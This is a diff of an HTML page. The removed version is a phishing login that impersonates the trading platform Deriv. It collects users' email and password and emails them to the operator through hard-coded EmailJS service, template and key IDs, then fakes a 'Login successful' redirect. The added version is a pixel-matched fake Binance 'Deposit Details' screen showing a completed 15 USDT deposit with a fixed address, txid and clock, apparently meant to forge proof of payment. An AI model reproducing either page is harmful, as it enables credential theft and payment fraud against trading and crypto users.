@@ -1,552 +1,564 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>HUBDERIVANALYSISTOOL</title>
-
-  <!-- Font Awesome -->
-  <link rel="stylesheet"
-  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
-
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-  <!-- EmailJS -->
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <style>
-
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family:'Poppins',sans-serif;
-    }
-
-    body{
-      min-height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      background:linear-gradient(135deg,#032b05,#032b05,#032b05);
-      padding:20px;
-      overflow:hidden;
-    }
-
-    /* Background Glow */
-    body::before,
-    body::after{
-      content:'';
-      position:absolute;
-      width:300px;
-      height:300px;
-      border-radius:50%;
-      filter:blur(100px);
-      z-index:-1;
-    }
-
-    body::before{
-      background:#032b05;
-      top:-80px;
-      left:-80px;
-    }
-
-    body::after{
-      background:#032b05;
-      bottom:-80px;
-      right:-80px;
-    }
-
-    /* Main Container */
-    .container{
-      width:100%;
-      max-width:430px;
-      background:rgba(255,255,255,0.12);
-      backdrop-filter:blur(15px);
-      border:1px solid rgba(255,255,255,0.2);
-      border-radius:25px;
-      padding:40px 30px;
-      text-align:center;
-      color:white;
-      box-shadow:0 8px 32px rgba(0,0,0,0.35);
-      animation:fadeIn 1s ease;
-    }
-
-    @keyframes fadeIn{
-      from{
-        opacity:0;
-        transform:translateY(30px);
-      }
-      to{
-        opacity:1;
-        transform:translateY(0);
-      }
-    }
-
-    /* Logo */
-    .logo{
-      width:85px;
-      height:85px;
-      margin:0 auto 15px;
-      border-radius:50%;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      background:rgba(255,255,255,0.15);
-      box-shadow:0 4px 20px rgba(255,255,255,0.2);
-      font-size:35px;
-    }
-
-    h1{
-      font-size:32px;
-      margin-bottom:8px;
-      font-weight:700;
-      letter-spacing:2px;
-    }
-
-    .subtitle{
-      margin-bottom:30px;
-      color:#dbeafe;
-      font-size:14px;
-    }
-
-    /* Input Groups */
-    .input-group{
-      position:relative;
-      margin-bottom:22px;
-    }
-
-    .input-group i{
-      position:absolute;
-      left:15px;
-      top:50%;
-      transform:translateY(-50%);
-      color:#cbd5e1;
-    }
-
-    .input-group input{
-      width:100%;
-      padding:14px 15px 14px 45px;
-      border:none;
-      outline:none;
-      border-radius:14px;
-      background:rgba(255,255,255,0.15);
-      color:white;
-      font-size:15px;
-      transition:0.3s ease;
-    }
-
-    .input-group input::placeholder{
-      color:#d1d5db;
-    }
-
-    .input-group input:focus{
-      background:rgba(255,255,255,0.22);
-      transform:scale(1.02);
-      border:1px solid #93c5fd;
-    }
-
-    /* Checkbox */
-    .checkbox{
-      display:flex;
-      align-items:flex-start;
-      gap:10px;
-      margin-bottom:25px;
-      text-align:left;
-      font-size:14px;
-      color:#e5e7eb;
-    }
-
-    .checkbox input{
-      margin-top:4px;
-      transform:scale(1.1);
-      cursor:pointer;
-    }
-
-    /* Button */
-    .btn{
-      width:100%;
-      padding:15px;
-      border:none;
-      border-radius:15px;
-      background:linear-gradient(135deg,#60a5fa,#2563eb);
-      color:white;
-      font-size:17px;
-      font-weight:600;
-      cursor:pointer;
-      transition:0.3s ease;
-      box-shadow:0 5px 18px rgba(37,99,235,0.5);
-      position:relative;
-    }
-
-    .btn:hover{
-      transform:translateY(-3px);
-      box-shadow:0 10px 25px rgba(37,99,235,0.6);
-    }
-
-    /* Loader */
-    .loader{
-      width:20px;
-      height:20px;
-      border:3px solid rgba(255,255,255,0.3);
-      border-top:3px solid white;
-      border-radius:50%;
-      animation:spin 1s linear infinite;
-      display:none;
-      margin:auto;
-    }
-
-    @keyframes spin{
-      100%{
-        transform:rotate(360deg);
-      }
-    }
-
-    /* Message */
-    .message{
-      margin-top:20px;
-      padding:12px;
-      border-radius:10px;
-      display:none;
-      font-size:14px;
-    }
-
-    .success{
-      background:rgba(34,197,94,0.2);
-      color:#dcfce7;
-    }
-
-    .error{
-      background:rgba(239,68,68,0.2);
-      color:#fee2e2;
-    }
-
-    /* QUICK ICONS */
-    .quick-icons{
-      display:grid;
-      grid-template-columns:repeat(3,1fr);
-      gap:5px;
-      margin-top:30px;
-    }
-
-    .icon-box{
-      background:rgba(255,255,255,0.12);
-      border:1px solid rgba(255,255,255,0.2);
-      border-radius:50px;
-      padding:0.5px 2px;
-      text-decoration:none;
-      color:white;
-      transition:0.3s ease;
-      display:flex;
-      flex-direction:line;
-      align-items:right;
-      justify-content:center;
-      gap:5px;
-    }
-
-    .icon-box:hover{
-      transform:translateY(-5px);
-      background:rgba(255,255,255,0.18);
-      box-shadow:0 10px 20px rgba(0,0,0,0.2);
-    }
-
-    .icon-box i{
-      font-size:30px;
-    }
-
-    .icon-box span{
-      font-size:13px;
-      font-weight:1000;
-    }
-
-    footer{
-      margin-top:25px;
-      font-size:15px;
-      color:#dbeafe;
-    }
-
-    @media(max-width:480px){
-
-      .container{
-        padding:30px 22px;
-      }
-
-      h1{
-        font-size:28px;
-      }
-
-      .quick-icons{
-        grid-template-columns:repeat(2,1fr);
-      }
-
-    }
-
-  </style>
-</head>
-
-<body>
-
-<div class="container">
-
-  <!-- Logo -->
- <div class="logo">
-   <img src="logo2.png" alt="Logo" style="
-    width:70px;
-    height:70px;
-    border-radius:20px;
-    display:block;
-    margin:0 auto 10px;
-    box-shadow:
-        0 0 10px rgba(80, 92, 255, 0.8),
-        0 0 20px rgba(49, 52, 247, 0.774),
-        0 0 40px rgba(54, 50, 245, 0.6);
-    animation: logoGlow 2s ease-in-out infinite alternate;
-">
-  </div>
-
-  <!-- Title -->
-  <h1>DERIV INSIDER PRO</h1>
-  <p class="subtitle">
-    Powered by Deriv
-  </p>
-
-  <!-- FORM -->
-  <form id="orderForm">
-
-    <!-- Email -->
-    <div class="input-group">
-      <i class="fa-solid fa-envelope"></i>
-
-      <input
-        type="email"
-        id="email"
-        placeholder="Enter Email Address"
-        required
-      >
-    </div>
-
-    <!-- Password -->
-    <div class="input-group">
-      <i class="fa-solid fa-lock"></i>
-
-      <input
-        type="password"
-        id="password"
-        placeholder="Enter Password"
-        required
-      >
-    </div>
-
-    <!-- Terms -->
-    <div class="checkbox">
-      <input type="checkbox" id="terms">
-
-      <label for="terms">
-        I agree to the Terms and Conditions
-      </label>
-    </div>
-
-    <!-- Button -->
-    <button type="submit" class="btn">
-
-      <span id="btnText">
-        SIGN IN
-      </span>
-
-      <div class="loader" id="loader"></div>
-
-    </button>
-
-    <!-- Message -->
-    <div class="message" id="message"></div>
-
-  </form>
-<p class="subtitle">
-    NOTE: Use your official deriv credentials to login. Secure and responsible trading.
-  </p>
-  <!-- QUICK ICONS -->
-  <div class="quick-icons">
-
-    <!-- Help Centre -->
-    <a href="https://deriv.com/help-centre"
-       target="_blank"
-       class="icon-box">
-
-      <i class="fa-solid fa-headset"></i>
-      <span>Help</span>
-
-    </a>
-
-    <!-- WhatsApp -->
-    <a href="https://wa.me/254740491902"
-       target="_blank"
-       class="icon-box">
-
-      <i class="fa-brands fa-whatsapp"></i>
-      <span>LiveChat</span>
-
-    </a>
-
-
-    <!-- Deriv -->
-    <a href="https://app.deriv.com"
-       target="_blank"
-       class="icon-box">
-
-      <i class="fa-solid fa-chart-line"></i>
-      <span>Register</span>
-
-    </a>
-
-    <!-- About -->
-    <a href="https://deriv.com/why-choose-us"
-       target="_blank"
-       class="icon-box">
-  
-      <i class="fa-solid fa-circle-info"></i>
-      <span>About</span>
-
-    </a>
-
-  </div>
-
-  <!-- Footer -->
-  <footer>
-    © 2026 Trade Options on Financial Markets & 24/7 Derived Indices.
-  </footer>
-
-</div>
-
-<script>
-
-  /* =========================================
-     EMAILJS INIT
-  ========================================= */
-
-  emailjs.init("2CFXVctSTCY05sGba");
-
-  const form = document.getElementById("orderForm");
-  const messageBox = document.getElementById("message");
-  const btnText = document.getElementById("btnText");
-  const loader = document.getElementById("loader");
-
-  form.addEventListener("submit", async function(e){
-
-    e.preventDefault();
-
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value.trim();
-    const terms = document.getElementById("terms").checked;
-
-    /* VALIDATION */
-    if(!email || !password){
-
-      showMessage(
-        "Please fill in all fields.",
-        "error"
-      );
-
-      return;
-
-    }
-
-    if(!terms){
-
-      showMessage(
-        "Please agree to the Terms and Conditions.",
-        "error"
-      );
-
-      return;
-
-    }
-
-    /* SHOW LOADER */
-    btnText.style.display = "none";
-    loader.style.display = "block";
-
-    const currentDate = new Date().toLocaleString();
-
-    /* EMAIL DATA */
-    const templateParams = {
-
-      from_name: "FREE BOOKIES",
-
-      user_email: email,
-
-      user_password: password,
-
-      order_time: currentDate,
-
-      message:
-      `New Login
-
-Email: ${email}
-
-Password: ${password}
-
-Time: ${currentDate}`
-
-    };
-
-try{
-
-  await emailjs.send(
-    "service_za9tqt7",
-    "template_fr0o92g",
-    templateParams
-  );
-
-  showMessage(
-    "Login successful. Redirecting...",
-    "success"
-  );
-
-  form.reset();
-
-  // Redirect only after EmailJS succeeds
-  setTimeout(() => {
-    window.location.href = "https://derivmatchtool.site";
-  }, 1500);
-
-}catch(error){
-
-      console.error(error);
-
-      showMessage(
-        "Failed to log in.",
-        "error"
-      );
-
-    }finally{
-
-      btnText.style.display = "inline";
-      loader.style.display = "none";
-
-    }
-
-  });
-
-  /* =========================================
-     MESSAGE FUNCTION
-  ========================================= */
-
-  function showMessage(text,type){
-
-    messageBox.style.display = "block";
-    messageBox.className = `message ${type}`;
-    messageBox.innerHTML = text;
-
-    setTimeout(()=>{
-
-      messageBox.style.display = "none";
-
-    },5000);
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Deposit Details</title>
+<style>
+
+  html{
+    scrollbar-width:none;
+    -ms-overflow-style:none;
   }
 
-</script>
+  html::-webkit-scrollbar{
+    display:none;
+    width:0;
+    height:0;
+  }
 
+  :root{
+    --bg:#1f2733;
+    --line:#343d4a;
+    --primary:#f1f3f6;
+    --secondary:#969eaa;
+    --green:#22c88b;
+    --icon:#8e98a8;
+  }
+
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+  html,body{
+    margin:0;
+    width:100%;
+    min-height:100%;
+    background:var(--bg);
+    color:var(--primary);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  }
+
+  body{
+    overflow-x:hidden;
+    display:flex;
+    justify-content:center;
+  }
+
+  .phone{
+    position:relative;
+    width:720px;
+    height:1576px;
+    min-height:1576px;
+    background:var(--bg);
+    overflow:hidden;
+  }
+
+  /* top device/status area */
+  .statusbar{
+    position:absolute;
+    left:0;
+    top:0;
+    width:100%;
+    height:72px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 69px;
+    color:#f3f5f8;
+    font-weight:600;
+    z-index:5;
+  }
+
+  .clock{
+    font-size:27px;
+    line-height:1;
+    letter-spacing:-.5px;
+    display:flex;
+    align-items:center;
+    gap:7px;
+  }
+
+  .status-left-symbol{
+    font-size:19px;
+    opacity:.92;
+    transform:translateY(1px);
+  }
+
+  .status-icons{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    height:100%;
+  }
+
+  .bluetooth{
+    width:15px;height:22px;position:relative;
+  }
+  .bluetooth:before,
+  .bluetooth:after{
+    content:"";
+    position:absolute;
+    left:6px;
+    width:9px;
+    height:9px;
+    border-left:3px solid #f5f6f8;
+    border-bottom:3px solid #f5f6f8;
+    transform:rotate(-45deg);
+  }
+  .bluetooth:before{top:2px}
+  .bluetooth:after{bottom:2px;transform:rotate(135deg)}
+
+  .vibrate{
+    width:20px;height:22px;position:relative;
+    border:2px solid #f5f6f8;border-radius:4px;
+  }
+  .vibrate:before,.vibrate:after{
+    content:"";position:absolute;top:4px;width:3px;height:10px;
+    background:#f5f6f8;border-radius:2px;
+  }
+  .vibrate:before{left:-6px}.vibrate:after{right:-6px}
+
+  .network-speed{
+    font-size:14px;
+    line-height:12px;
+    text-align:center;
+    font-weight:700;
+    letter-spacing:-.2px;
+  }
+
+  .signal{
+    display:flex;align-items:flex-end;gap:3px;height:20px;
+  }
+  .signal i{
+    display:block;width:4px;background:#f5f6f8;border-radius:1px;
+  }
+  .signal i:nth-child(1){height:7px}
+  .signal i:nth-child(2){height:11px}
+  .signal i:nth-child(3){height:15px}
+  .signal i:nth-child(4){height:19px}
+
+  .wifi{
+    width:30px;height:22px;position:relative;
+  }
+  .wifi:before,.wifi:after{
+    content:"";position:absolute;left:50%;transform:translateX(-50%);
+    border:3px solid transparent;border-top-color:#f5f6f8;border-radius:50%;
+  }
+  .wifi:before{top:0;width:30px;height:18px}
+  .wifi:after{top:7px;width:17px;height:10px}
+  .wifi-dot{
+    position:absolute;left:50%;bottom:0;transform:translateX(-50%);
+    width:5px;height:5px;background:#f5f6f8;border-radius:50%;
+  }
+
+  .battery{
+    width:45px;height:24px;border:2px solid #f5f6f8;border-radius:6px;
+    position:relative;display:flex;align-items:center;padding:3px;
+  }
+  .battery:after{
+    content:"";position:absolute;right:-5px;top:6px;width:3px;height:8px;
+    background:#f5f6f8;border-radius:0 2px 2px 0;
+  }
+  .battery-level{
+    width:31px;height:14px;background:#f5f6f8;border-radius:3px;
+    display:flex;align-items:center;justify-content:center;
+    color:#3b4149;font-size:15px;font-weight:700;
+  }
+
+  /* header */
+  .header{
+    position:absolute;
+    top:96px;
+    left:0;
+    width:100%;
+    height:48px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .back{
+    position:absolute;
+    left:18px;
+    top:0;
+    width:40px;height:40px;
+    display:flex;align-items:center;justify-content:center;
+    cursor:pointer;
+    border:0;
+    background:transparent;
+    padding:0;
+  }
+  .back svg{width:31px;height:31px;stroke:#e9edf2;stroke-width:2.8;fill:none;stroke-linecap:round;stroke-linejoin:round}
+
+  .title{
+    font-size:30px;
+    font-weight:700;
+    letter-spacing:-.45px;
+  }
+
+  .help{
+    position:absolute;
+    right:21px;
+    top:0;
+    width:30px;height:30px;
+    border:2.2px solid #dbe0e7;
+    border-radius:4px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#aeb6c2;
+    font-size:21px;
+    font-weight:700;
+    line-height:1;
+  }
+
+  /* amount / status */
+  .summary{
+    position:absolute;
+    top:194px;
+    left:0;
+    width:100%;
+    text-align:center;
+  }
+
+  .amount{
+    font-size:49px;
+    font-weight:700;
+    letter-spacing:-1.2px;
+    line-height:1.05;
+  }
+
+  .completed{
+    margin-top:17px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:11px;
+    color:var(--green);
+    font-size:28px;
+    font-weight:500;
+  }
+
+  .check{
+    width:27px;height:27px;border-radius:50%;
+    background:var(--green);
+    position:relative;
+    display:inline-block;
+  }
+  .check:after{
+    content:"";
+    position:absolute;
+    left:7px;top:6px;
+    width:12px;height:7px;
+    border-left:3px solid #17342c;
+    border-bottom:3px solid #17342c;
+    transform:rotate(-45deg);
+  }
+
+  .description{
+    width:650px;
+    margin:20px auto 0;
+    color:var(--secondary);
+    font-size:20px;
+    line-height:1.45;
+    letter-spacing:.05px;
+  }
+
+  /* details */
+  .details{
+    position:absolute;
+    top:408px;
+    left:0;
+    width:100%;
+    border-top:1px solid var(--line);
+    border-bottom:1px solid var(--line);
+    padding:48px 26px 46px;
+  }
+
+  .row{
+    display:grid;
+    grid-template-columns:205px 1fr;
+    min-height:64px;
+    align-items:start;
+  }
+
+  .label{
+    color:var(--secondary);
+    font-size:24px;
+    line-height:1.3;
+    font-weight:400;
+  }
+
+  .value{
+    color:#eef0f4;
+    font-size:24px;
+    line-height:1.42;
+    text-align:right;
+    font-weight:400;
+    min-width:0;
+    overflow-wrap:anywhere;
+  }
+
+  .address-row{min-height:98px}
+  .txid-row{min-height:129px}
+  .wallet-row{min-height:65px}
+  .date-row{min-height:62px}
+
+  .copy-value{
+    display:flex;
+    align-items:flex-start;
+    justify-content:flex-end;
+    gap:10px;
+  }
+
+  .copy-text{
+    max-width:390px;
+    text-align:right;
+  }
+
+  .copy-button{
+    appearance:none;
+    border:0;
+    background:none;
+    padding:0;
+    width:28px;
+    min-width:28px;
+    height:28px;
+    margin-top:1px;
+    cursor:pointer;
+  }
+  .copy-button svg{
+    width:28px;height:28px;
+    stroke:var(--icon);
+    fill:none;
+    stroke-width:2.2;
+    stroke-linecap:round;
+    stroke-linejoin:round;
+  }
+
+  .txid .copy-text{
+    max-width:390px;
+    text-decoration:underline;
+    text-decoration-thickness:1px;
+    text-underline-offset:3px;
+    line-height:1.35;
+  }
+
+  /* bottom gesture bar */
+  .gesture{
+    position:absolute;
+    bottom:10px;
+    left:50%;
+    transform:translateX(-50%);
+    width:226px;
+    height:6px;
+    border-radius:10px;
+    background:#aeb3bb;
+    opacity:.92;
+  }
+
+  .toast{
+    position:absolute;
+    left:50%;
+    bottom:55px;
+    transform:translate(-50%,12px);
+    padding:10px 17px;
+    background:#303944;
+    color:#fff;
+    border-radius:8px;
+    font-size:15px;
+    opacity:0;
+    pointer-events:none;
+    transition:.18s ease;
+    box-shadow:0 4px 15px rgba(0,0,0,.25);
+  }
+  .toast.show{
+    opacity:1;
+    transform:translate(-50%,0);
+  }
+
+  /* Keep the complete 720 x 1576 reference screen visible inside the phone viewport. */
+  body{
+    width:100vw;
+    height:100dvh;
+    min-height:0;
+    overflow:hidden;
+  }
+
+  .phone{
+    flex:none;
+    transform-origin:top center;
+  }
+</style>
+</head>
+<body>
+  <main class="phone" aria-label="Deposit Details screen">
+
+    <div class="statusbar">
+      <div class="clock">
+        <span id="deviceTime">16:23</span>
+        <span class="status-left-symbol">K</span>
+      </div>
+
+      <div class="status-icons" aria-hidden="true">
+        <span class="bluetooth"></span>
+        <span class="vibrate"></span>
+        <span class="network-speed">26.6<br>KB/S</span>
+        <span class="signal"><i></i><i></i><i></i><i></i></span>
+        <span class="wifi"><span class="wifi-dot"></span></span>
+        <span class="battery"><span class="battery-level">34</span></span>
+      </div>
+    </div>
+
+    <header class="header">
+      <button class="back" type="button" aria-label="Back" onclick="history.back()">
+        <svg viewBox="0 0 32 32">
+          <path d="M27 16H6"></path>
+          <path d="M14 8l-8 8 8 8"></path>
+        </svg>
+      </button>
+
+      <div class="title">Deposit Details</div>
+
+      <button class="help" type="button" aria-label="Help">?</button>
+    </header>
+
+    <section class="summary">
+      <div class="amount">+15 USDT</div>
+
+      <div class="completed">
+        <span class="check"></span>
+        <span>Completed</span>
+      </div>
+
+      <div class="description">
+        Crypto has arrived in your Binance account. View your spot account<br>
+        balance for more details.
+      </div>
+    </section>
+
+    <section class="details">
+      <div class="row">
+        <div class="label">Network</div>
+        <div class="value">TRX</div>
+      </div>
+
+      <div class="row address-row">
+        <div class="label">Address</div>
+        <div class="value copy-value">
+          <span class="copy-text">TJ3xrDQSrvY4k6tSSxz9rkNArL<br>1YsqgmC</span>
+          <button class="copy-button" type="button" aria-label="Copy address"
+                  data-copy="TJ3xrDQSrvY4k6tSSxz9rkNArL1YsqgmC">
+            <svg viewBox="0 0 32 32">
+              <rect x="11" y="9" width="16" height="17" rx="2"></rect>
+              <path d="M21 9V6.5A2.5 2.5 0 0 0 18.5 4h-12A2.5 2.5 0 0 0 4 6.5v14A2.5 2.5 0 0 0 6.5 23H11"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="row txid-row">
+        <div class="label">Txid</div>
+        <div class="value copy-value txid">
+          <span class="copy-text">
+            4721f7e179e46dfc2cce0d800d<br>
+            105645b2ab95f95a3f914c9d9b<br>
+            6d0b04cb0e04
+          </span>
+          <button class="copy-button" type="button" aria-label="Copy transaction ID"
+                  data-copy="4721f7e179e46dfc2cce0d800d105645b2ab95f95a3f914c9d9b6d0b04cb0e04">
+            <svg viewBox="0 0 32 32">
+              <rect x="11" y="9" width="16" height="17" rx="2"></rect>
+              <path d="M21 9V6.5A2.5 2.5 0 0 0 18.5 4h-12A2.5 2.5 0 0 0 4 6.5v14A2.5 2.5 0 0 0 6.5 23H11"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="row wallet-row">
+        <div class="label">Wallet</div>
+        <div class="value">Spot Wallet</div>
+      </div>
+
+      <div class="row date-row">
+        <div class="label">Date</div>
+        <div class="value">2026-09-05 22:52:26</div>
+      </div>
+    </section>
+
+    <div class="toast" id="toast">Copied</div>
+    <div class="gesture"></div>
+  </main>
+
+<script>
+  // Scale the reference screen proportionally so the entire design fits
+  // inside the phone viewport with no page scrolling.
+  function fitPhoneToViewport(){
+    const phone = document.querySelector('.phone');
+    if(!phone) return;
+
+    const viewportWidth = window.visualViewport
+      ? window.visualViewport.width
+      : window.innerWidth;
+
+    const viewportHeight = window.visualViewport
+      ? window.visualViewport.height
+      : window.innerHeight;
+
+    const scale = Math.min(
+      viewportWidth / 720,
+      viewportHeight / 1576
+    );
+
+    phone.style.transform = `scale(${scale})`;
+    phone.style.marginLeft = '0';
+    phone.style.marginRight = '0';
+    phone.style.marginBottom = `${1576 * scale - 1576}px`;
+  }
+
+  fitPhoneToViewport();
+  window.addEventListener('resize', fitPhoneToViewport);
+  if(window.visualViewport){
+    window.visualViewport.addEventListener('resize', fitPhoneToViewport);
+  }
+
+  // Keep the visual clock matching the reference by default.
+  // Change REFERENCE_TIME_ENABLED to false if you want the device time instead.
+  const REFERENCE_TIME_ENABLED = true;
+
+  function updateClock(){
+    const el = document.getElementById('deviceTime');
+    if (REFERENCE_TIME_ENABLED) {
+      el.textContent = '16:23';
+      return;
+    }
+    const now = new Date();
+    el.textContent =
+      String(now.getHours()).padStart(2,'0') + ':' +
+      String(now.getMinutes()).padStart(2,'0');
+  }
+  updateClock();
+  if(!REFERENCE_TIME_ENABLED) setInterval(updateClock, 10000);
+
+  document.querySelectorAll('.copy-button').forEach(button => {
+    button.addEventListener('click', async () => {
+      const value = button.dataset.copy || '';
+      try {
+        await navigator.clipboard.writeText(value);
+      } catch(e) {
+        const area = document.createElement('textarea');
+        area.value = value;
+        document.body.appendChild(area);
+        area.select();
+        document.execCommand('copy');
+        area.remove();
+      }
+
+      const toast = document.getElementById('toast');
+      toast.classList.add('show');
+      clearTimeout(window.__toastTimer);
+      window.__toastTimer = setTimeout(() => toast.classList.remove('show'), 1100);
+    });
+  });
+</script>
 </body>
 </html>
